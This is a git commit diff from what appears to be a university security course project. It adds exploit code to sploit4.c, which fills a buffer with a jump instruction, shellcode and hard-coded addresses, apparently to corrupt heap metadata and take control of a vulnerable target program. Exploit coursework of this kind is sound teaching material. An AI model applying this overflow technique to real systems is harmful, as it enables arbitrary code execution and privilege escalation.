490249de8adc595f8a2d398caeb312af46438a52
Bryan Cheng <bryan.b.cheng@gmail.com>
2014-04-08 01:23:02 +0000

    did #4

--- proj1/sploits/sploit4.c
+++ proj1/sploits/sploit4.c
@@ -11,7 +11,17 @@ int main(void)
   char *args[3];
   char *env[1];
 
-  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
+  char exploit[1024];
+  memset(exploit, 0xff, 1024);
+  exploit[0] = 0xeb;
+  exploit[1] = 0x06;
+  memcpy(exploit + 8, shellcode, sizeof(shellcode) - 1);
+  int *psl = (int *)(exploit + 504);
+  *psl = 0x0804a068;
+  int *psr = (int *)(exploit + 508);
+  *psr = 0xbffffa44;
+
+  args[0] = TARGET; args[1] = exploit; args[2] = NULL;
   env[0] = NULL;
 
   if (0 > execve(TARGET, args, env))
